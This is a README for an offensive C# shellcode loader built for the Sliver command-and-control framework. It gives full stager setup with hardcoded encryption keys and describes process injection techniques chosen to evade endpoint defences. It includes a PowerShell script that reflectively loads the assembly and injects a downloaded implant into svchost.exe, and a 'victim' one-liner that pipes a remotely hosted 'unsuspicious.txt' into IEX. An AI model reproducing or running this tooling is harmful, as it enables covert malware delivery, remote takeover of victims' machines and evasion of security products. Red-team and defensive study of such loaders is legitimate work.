# SliverLoader

A modular C# loader for Sliver C2 shellcode with multiple injection techniques and evasion capabilities. SliverLoader can inject into existing processes or spawn new ones, uses NT APIs, and maintains a small footprint suitable for reflective loading.

## Sliver C2 Setup

The chosen Command and Control (C2) framework is [Sliver](https://github.com/BishopFox/sliver) developed by BishopFox, although the concept is adaptable to other frameworks such as Metasploit or Havoc. Follow the installation instructions provided on the [Getting Started](https://sliver.sh/docs?name=Getting+Started) page of Sliver's wiki to set it up.

The next steps involve setting up the necessary profile, listener, and stage-listener. It is noted that the IP addresses and paths to assets, such as certificates, need to be adjusted to fit the specific environment.

Create a reusable profile for the scenario

```bash
sliver > profiles new -b https://127.0.0.1:443 --skip-symbols --format shellcode --arch amd64 bleed
```

Start the listener with the same port as specified in the profile and the certificate and key generated from metasploit

```bash
sliver > https -L 127.0.0.1 -l 443
```

Start the staging server and add the compression/encryption algorithm.

```bash
sliver > profiles stage -c deflate9 -i '8y/B?E(G+KbPeShV' -k 'D(G+KbPeShVmYq3t' bleed
```

> [!note]
> Older versions of sliver set the compression and encryption in the `stage-listener` command as follows:
> ```bash
> stage-listener --url https://127.0.0.1:8443 --profile custom -C deflate9 --aes-encrypt-key 'D(G+KbPeShVmYq3t' --aes-encrypt-iv '8y/B?E(G+KbPeShV'
> ```

Confirm that our listeners and stagers are ready.

```bash
sliver > jobs
sliver > profiles stage
sliver > implants
```

## Shellcode Runner

The shellcode runner is implemented in C# as a modular loader that supports multiple staging scenarios offered by Sliver C2, including raw shellcode, AES encryption, GZIP or Deflate compression, and combinations thereof. The loader is designed for in-memory execution to avoid touching the disk, and accepts command-line arguments for flexible configuration without hard-coded parameters. The implementation can be compiled either as a standalone executable for direct execution or as a DLL for reflective loading via PowerShell.

## Process Injection

The loader employs multiple process injection techniques with automatic fallback to ensure reliability across different environments. The primary method uses NtCreateThreadEx, an NT API that bypasses many EDR hooks by avoiding the Win32 API layer. If this fails, the loader falls back to CreateRemoteThread, a reliable Win32 API method. As a final alternative, the loader attempts APC queue injection, which can be stealthier in some scenarios. Memory is allocated as PAGE_READWRITE, the shellcode is written, and protection is then changed to PAGE_EXECUTE_READ, ensuring the memory region is never simultaneously writable and executable.

## Compilation

Compile the loader as a standalone executable using the C# compiler.

```Powershell
csc.exe /platform:x64 /target:exe /main:serpent.Program /out:SerpentLoader.exe Program.cs Loader.cs
```

For PowerShell reflection, compile as a DLL.

## Powershell Loader

The loader can be used as a PowerShell script hosted on a web server. The script then loads the stager into memory via reflection and performs the download and execution of the agent from the staging server. To create the loader, the following steps are necessary:

First, the raw bytes of the assembly will need to be copied. For this, a PowerShell command will be used, which will copy the data to the clipboard.

```powershell
PS C:\> get-content -encoding byte -path .\sliverloader.dll | clip
```

Next use [CyberChef](https://cyberchef.io) to convert the data to base64. Convert "From Decimal" with delimiter Line feed "To Base64" with this [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Line%20feed',false)To_Base64('A-Za-z0-9%2B/%3D')).

As powershell doesn't support **Raw Byte Encoding** which **Sliver C2** expects for **AES Encryption** and hardcoded keys in the assembly are not an option, they keys have to be converted with this [CyberChef recipe](https://cyberchef.io/#recipe=To_Hex('0x%20with%20comma',0)).

Finally copy the converted values to the script as in `Loader.ps1`.

> [!note]
> To fetch a stage 2 payload via HTTP in newer versions of Sliver, you need to query a URL that looks like this: `http://YOUR_IP/whatever.config?x=IMPLANT_ID`.

```powershell
$encodeStr = "TVqQAAMAAAAEAAAA...<SNIP>"

[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($encodeStr))

#$url = "https://$SLIVER_IP:8443/config.woff"
$url = "https://$SLIVER_IP/config.yml?x=$IMPLANT_ID"
$TargetBinary = "svchost.exe"
[byte[]]$AESKey = 0x44,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56,0x6d,0x59,0x71,0x33,0x74
[byte[]]$AESIV = 0x38,0x79,0x2f,0x42,0x3f,0x45,0x28,0x47,0x2b,0x4b,0x62,0x50,0x65,0x53,0x68,0x56

$CompressionAlgorithm = "deflate9"
[serpent.Loader]::DownloadAndExecute($url,$TargetBinary,$CompressionAlgorithm,$AESKey,$AESIV)
```

## Deployment

The powershell loader is hosted on a webserver as `.txt` file e.g. `unsuspicious.txt`.
On the victim, the following command executes the download and staging of the agent which will result in an incoming session in sliver.

```Powershell
(New-Object System.Net.WebClient).DownloadString('https://some-server/unsuspicious.txt') | IEX
```